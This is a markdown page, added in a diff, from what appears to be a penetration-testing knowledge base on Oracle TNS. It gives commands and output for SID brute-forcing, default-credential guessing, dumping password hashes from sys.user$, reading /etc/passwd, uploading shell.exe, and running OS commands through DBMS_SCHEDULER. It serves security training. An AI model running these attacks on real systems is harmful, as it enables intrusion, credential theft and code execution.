@@ -1,0 +1,388 @@
+---
+title: Oracle TNS
+description: Oracle Database footprinting - TNS Listener on port 1521, SID enumeration, default-credential testing, schema enum via sqlplus, hash extraction from sys.user$, and the ODAT tool chain.
+mitre: [T1046, T1078, T1213]
+d3fend: [D3-NTA]
+impact: [RCE, DataExfil, CredentialTheft, FileRead, FileWrite]
+sidebar:
+  order: 11
+  label: Oracle TNS
+---
+
+## TL;DR
+
+Oracle Database uses the **TNS (Transparent Network Substrate)** protocol on TCP 1521 by default. Unlike MySQL/MSSQL, you connect to a *listener* on 1521 which then routes you to a specific *SID* (System Identifier) or *Service Name* - each representing a database instance. Recon goes in two stages: enumerate the listener, find valid SIDs, then test credentials per SID.
+
+```
+# 1. Service scan
+nmap -sV -sC -p1521 --script oracle-tns-version,oracle-sid-brute <target>
+
+# 2. SID brute-force (via ODAT)
+odat sidguesser -s <target> -p 1521
+
+# 3. Default-credential test against each found SID
+odat passwordguesser -s <target> -p 1521 -d <SID> --accounts-file accounts.txt
+
+# 4. Connect with valid creds
+sqlplus user/password@<target>:1521/<SID>
+
+# 5. Run SQL
+SQL> select * from session_privs;
+SQL> select username, password from sys.user$ where password is not null;
+```
+
+Success indicator: ODAT returns one or more valid `SID:user/password` triples; `sqlplus` connects; `select user from dual` returns the authenticated username.
+
+## Protocol overview
+
+Oracle's networking stack is layered:
+
+```
+Client                                  Oracle Server
+  ↓                                       ↓
+TNS Listener (on 1521 by default)
+  ↓                                       ↓
+Specific database instance (SID / service)
+  ↓                                       ↓
+Schema (user account) within that instance
+```
+
+The TNS Listener is the gatekeeper - it answers on 1521, accepts a connect packet that names a SID or Service Name, and either forwards the connection to that instance or returns an error.
+
+| Term | Meaning |
+| --- | --- |
+| **TNS** | Transparent Network Substrate - Oracle's network protocol |
+| **Listener** | The daemon that accepts incoming connections on 1521 |
+| **SID** (System Identifier) | Unique name for a database *instance* (a running Oracle process) |
+| **Service Name** | Alias that can refer to one or more instances (used in RAC clusters) |
+| **Schema** | A user account with its own owned objects (tables, views, procedures) |
+| **Privilege** | Permission to perform operations (CREATE TABLE, SELECT, etc.) |
+| **Role** | Bundle of privileges granted as a unit (`DBA`, `RESOURCE`, `CONNECT`) |
+
+A connection string is `user/password@host:port/SID` or `user/password@host:port/service_name`.
+
+### Default SIDs by Oracle version
+
+Different versions ship with different default SIDs. Brute-force lists should cover common candidates:
+
+| Version / Edition | Common default SIDs |
+| --- | --- |
+| Oracle 8 / 9i | `ORCL` |
+| Oracle 10g / 11g (Enterprise) | `ORCL` |
+| Oracle 11g XE (Express) | `XE` |
+| Oracle 12c+ | `ORCL`, `ORCLCDB` (container DB), `ORCLPDB1` (pluggable) |
+| Oracle Application Server | `OAS`, `IAS` |
+| Oracle Database Cloud | `cdb1`, `<custom>` |
+
+The [list of well-known SIDs](https://github.com/quentinhardy/odat/blob/master/sids.txt) bundled with ODAT covers the common cases plus thousands of installer-default and customer-encountered values.
+
+### Default Oracle accounts
+
+Many default accounts ship with well-known passwords and weren't always locked in older versions:
+
+| Username | Default password | Role |
+| --- | --- | --- |
+| `SYS` | `CHANGE_ON_INSTALL`, `MANAGER` | DBA |
+| `SYSTEM` | `MANAGER` | DBA |
+| `DBSNMP` | `DBSNMP` | OEM monitoring |
+| `OUTLN` | `OUTLN` | Stored outlines |
+| `MGMT_VIEW` | `MGMT_VIEW` | OEM |
+| `SCOTT` | `TIGER` | Demo (legendary) |
+| `HR` | `HR` | Demo schema |
+| `OE` | `OE` | Order Entry demo schema |
+| `XDB` | `XDB`, `CHANGE_ON_INSTALL` | XML DB |
+| `MDSYS` | `MDSYS` | Spatial |
+| `CTXSYS` | `CTXSYS` | Text |
+
+A comprehensive list lives in [ODAT's accounts.txt](https://github.com/quentinhardy/odat/blob/master/accounts/accounts.txt) - about 600 username/password pairs covering Oracle defaults across versions and installed components.
+
+## Default configuration
+
+The TNS Listener's config (`/u01/app/oracle/product/<version>/network/admin/listener.ora`) defines which SIDs the listener serves:
+
+```
+LISTENER =
+  (DESCRIPTION_LIST =
+    (DESCRIPTION =
+      (ADDRESS = (PROTOCOL = TCP)(HOST = 0.0.0.0)(PORT = 1521))
+      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
+    )
+  )
+
+SID_LIST_LISTENER =
+  (SID_LIST =
+    (SID_DESC =
+      (SID_NAME = ORCL)
+      (ORACLE_HOME = /u01/app/oracle/product/19.0.0/dbhome_1)
+    )
+  )
+```
+
+Modern Oracle versions (11g+) use **dynamic service registration** - instances register themselves with the listener at startup, and `SID_LIST_LISTENER` may be empty in the config file while the listener still serves multiple SIDs.
+
+The status command (`lsnrctl status`) shows registered services - when you have local access. Externally, you query the listener via TNS.
+
+## Dangerous settings
+
+| Setting | What it enables |
+| --- | --- |
+| Listener exposed on `0.0.0.0:1521` | Public-internet reachable database listener |
+| No `LOCAL_OS_AUTHENTICATION_<listener_name> = OFF` | Allows `SET CURRENT_LISTENER ...` style commands (pre-11g vulnerability) |
+| Unlocked default accounts | `SYS/CHANGE_ON_INSTALL`, `SYSTEM/MANAGER`, `SCOTT/TIGER` and friends still active |
+| `REMOTE_OS_AUTHENT = TRUE` | Trusts remote OS authentication - fairly easy to forge |
+| `O7_DICTIONARY_ACCESSIBILITY = TRUE` | Backward-compat setting that exposes the data dictionary to non-DBA users |
+| Granted `PUBLIC` excessive privileges | Anyone authenticated can do operations they shouldn't |
+| `DBMS_LDAP` and friends not revoked from PUBLIC | Anyone authenticated can make outbound LDAP/HTTP connections from the DB |
+| `utl_file_dir = *` (deprecated but still seen) | Old file-access setting - any path readable/writable by Oracle process |
+| `CREATE ANY DIRECTORY` granted to non-DBAs | File-system access via directory objects |
+
+The combination of "exposed on the network" + "default accounts not locked" is the most common Oracle finding in practice. The combination of "credentialed access with DBA" + `dbms_xdb_config`, `utl_http`, or `utl_file` is the path from "I have credentials" to "I read/write arbitrary files on the host."
+
+## Footprinting commands
+
+### Service scan and version probe
+
+```shell
+sudo nmap -sV -sC -p1521 10.129.14.128
+```
+
+```
+PORT     STATE SERVICE VERSION
+1521/tcp open  oracle-tns Oracle TNS Listener 11.2.0.2.0 (unauthorized)
+```
+
+The version (`11.2.0.2.0`) is volunteered by the listener without authentication. Cross-reference for known CVEs.
+
+```shell
+sudo nmap -sV -p1521 --script "oracle-tns-version,oracle-sid-brute" 10.129.14.128
+```
+
+```
+PORT     STATE SERVICE VERSION
+1521/tcp open  oracle-tns Oracle TNS Listener 11.2.0.2.0 (unauthorized)
+| oracle-sid-brute:
+|   ORCL
+|   XE
+|_  PLSExtProc
+```
+
+NSE's `oracle-sid-brute` walks a built-in wordlist. It'll find common SIDs quickly.
+
+### SID enumeration with ODAT
+
+[ODAT](https://github.com/quentinhardy/odat) (Oracle Database Attacking Tool) is the operator's Swiss Army knife for Oracle:
+
+```shell
+odat sidguesser -s 10.129.14.128 -p 1521
+```
+
+```
+[+] We found 2 SIDs
+[+] SIDs found:
+    - XE
+    - PLSExtProc
+```
+
+The default wordlist contains thousands of SIDs. For a wider sweep, point `--sids-file` at a custom list.
+
+```shell
+# All-version brute (slower but comprehensive)
+odat all -s 10.129.14.128 -p 1521
+```
+
+`odat all` runs every applicable check - sidguesser, passwordguesser, listener exploits, version-specific vulnerabilities - in sequence.
+
+### Password brute-force per SID
+
+Once you have SIDs, brute-force credentials against each:
+
+```shell
+odat passwordguesser -s 10.129.14.128 -p 1521 -d XE \
+  --accounts-file accounts.txt
+```
+
+```
+[+] Valid credential : SYSTEM/manager
+[+] Valid credential : SCOTT/tiger
+```
+
+The included `accounts.txt` covers the standard Oracle defaults. For environments where the admin set custom passwords, supplement with the engagement-specific password list - same approach as any other database brute-force.
+
+The Hydra option:
+
+```shell
+hydra -L users.txt -P passwords.txt oracle-listener://10.129.14.128 \
+  -s 1521 -F -t 4
+```
+
+### Connecting with sqlplus
+
+```shell
+sqlplus SYSTEM/manager@10.129.14.128:1521/XE
+```
+
+If `sqlplus` isn't installed locally, use Oracle Instant Client (rpm/deb from Oracle) or `sqlcl` (Java-based, more portable). On Kali, `apt install oracle-sqldeveloper` provides a usable client.
+
+Connection options:
+
+```shell
+# As SYSDBA (full DBA, requires SYSDBA privilege grant)
+sqlplus SYS/manager@10.129.14.128:1521/XE as sysdba
+
+# As SYSOPER (operations role)
+sqlplus user/password@target/SID as sysoper
+
+# Service name instead of SID (separated by /)
+sqlplus user/password@//target:1521/service.name
+
+# Using TNS alias from tnsnames.ora
+sqlplus user/password@my_alias
+```
+
+### Database enumeration
+
+```sql
+SQL> show user;
+USER is "SYSTEM"
+
+-- All schemas / database users
+SQL> select username from all_users;
+USERNAME
+-------------------
+SYS
+SYSTEM
+ANONYMOUS
+APEX_PUBLIC_USER
+CTXSYS
+HR
+MDSYS
+SCOTT
+XDB
+
+-- Tables you can access
+SQL> select owner, table_name from all_tables where owner not in
+     ('SYS','SYSTEM','MDSYS','CTXSYS','XDB','APEX_040000','APEX_PUBLIC_USER');
+
+-- Columns in a specific table
+SQL> select column_name, data_type from all_tab_columns
+     where owner = 'HR' and table_name = 'EMPLOYEES';
+
+-- Your effective privileges
+SQL> select * from session_privs;
+SQL> select * from user_role_privs;
+
+-- All system privileges granted (system-wide audit)
+SQL> select grantee, privilege from dba_sys_privs where grantee = 'SCOTT';
+```
+
+### Password hash extraction
+
+Oracle stores hashes in `SYS.USER$`:
+
+```sql
+SQL> select name, password from sys.user$ where password is not null;
+NAME            PASSWORD
+--------------- ----------------
+SYS             5638228DAF52805F
+SYSTEM          D4DF7931AB130E37
+SCOTT           F894844C34402B67
+```
+
+Older hashes (Oracle ≤10g) are the DES-based `password` column - crackable with `hashcat -m 3100`.
+
+Newer hashes (11g+) live in the `spare4` column with multiple formats:
+
+```sql
+SQL> select name, spare4 from sys.user$ where spare4 is not null;
+NAME            SPARE4
+--------------- ----------------------------------------------------------
+SYSTEM          S:0E78EF<...>;H:F0E07<...>;T:5A1<...>
+```
+
+- `S:` prefix - SHA-1 with salt, `hashcat -m 112`
+- `H:` prefix - older MD5-based, `hashcat -m 3100`-related
+- `T:` prefix - Oracle 12c+ SHA-512 with PBKDF2, `hashcat -m 12300`
+
+ODAT can dump these directly:
+
+```shell
+odat passwordstealer -s 10.129.14.128 -d XE -U SYSTEM -P manager
+```
+
+### File read/write with ODAT
+
+When you have a `CREATE ANY DIRECTORY` privilege (DBA has it, many other roles have it too):
+
+```shell
+# Upload a file
+odat utlfile -s 10.129.14.128 -d XE -U SYSTEM -P manager \
+  --putFile C:/temp shell.exe /tmp/shell.exe
+
+# Download a file
+odat utlfile -s 10.129.14.128 -d XE -U SYSTEM -P manager \
+  --getFile C:/ boot.ini ./boot.ini
+
+# External-table read (works with lower privileges sometimes)
+odat externaltable -s 10.129.14.128 -d XE -U SYSTEM -P manager \
+  --getFile /etc passwd ./passwd
+```
+
+The `dbms_advisor` module can also reach the file system in certain configurations.
+
+### RCE via Oracle
+
+Multiple paths exist depending on version and privileges:
+
+```shell
+# Java payload (Oracle 11g+, requires javaPrivilegeGrants)
+odat java -s 10.129.14.128 -d XE -U SYSTEM -P manager \
+  --exec /tmp 'id > /tmp/out'
+
+# CTXSYS.DRILOAD (Oracle 10g vulnerability)
+odat ctxsys -s 10.129.14.128 -d XE -U SCOTT -P tiger
+
+# Scheduler (DBMS_SCHEDULER) to run OS commands
+odat dbmsscheduler -s 10.129.14.128 -d XE -U SYSTEM -P manager \
+  --exec 'cmd.exe /c whoami > C:\\temp\\out.txt'
+```
+
+Each module has its own privilege requirements; `odat all` enumerates which modules will work given your current credentials.
+
+## Common chained workflows
+
+**Listener → SIDs → default creds → DBA → host RCE:**
+1. `nmap` confirms listener on 1521
+2. `odat sidguesser` finds `XE`
+3. `odat passwordguesser` finds `SYSTEM/manager`
+4. ODAT confirms DBA role
+5. `odat externaltable` or `odat dbmsscheduler` for file read or RCE
+
+**App credentials in config → low-priv access → privilege escalation:**
+1. Find Oracle creds in a web app config or filesystem
+2. Login as the application user (often with limited grants)
+3. Test for known Oracle CVE privilege escalation paths (`CREATE PROCEDURE`/`AUTHID DEFINER` abuse)
+4. Escalate to DBA, repeat the DBA workflow
+
+**File read → tnsnames.ora → discover other DBs:**
+1. With file-read primitive, fetch `tnsnames.ora` from `$ORACLE_HOME/network/admin/`
+2. The file lists aliases for *all* databases the host knows about - internal DBs, replicas, dev/staging
+3. Add each newly-discovered TNS target to your scan list
+
+## Quick reference
+
+| Task | Command |
+| --- | --- |
+| Service scan | `nmap -sV --script oracle-tns-version,oracle-sid-brute -p1521 <target>` |
+| SID brute | `odat sidguesser -s <target> -p 1521` |
+| Password brute | `odat passwordguesser -s <target> -p 1521 -d <SID> --accounts-file accounts.txt` |
+| Run all checks | `odat all -s <target> -p 1521` |
+| sqlplus connect | `sqlplus user/pass@<target>:1521/<SID>` |
+| sqlplus as DBA | `sqlplus user/pass@<target>:1521/<SID> as sysdba` |
+| Current user | `SELECT user FROM dual;` |
+| List schemas | `SELECT username FROM all_users;` |
+| List tables | `SELECT owner, table_name FROM all_tables;` |
+| Current privileges | `SELECT * FROM session_privs;` |
+| Dump hashes | `SELECT name, password, spare4 FROM sys.user$;` |
+| File read | `odat utlfile ... --getFile <dir> <file> <localpath>` |
+| File write | `odat utlfile ... --putFile <localpath> <remotedir> <remotefile>` |
+| RCE via scheduler | `odat dbmsscheduler ... --exec '<command>'` |
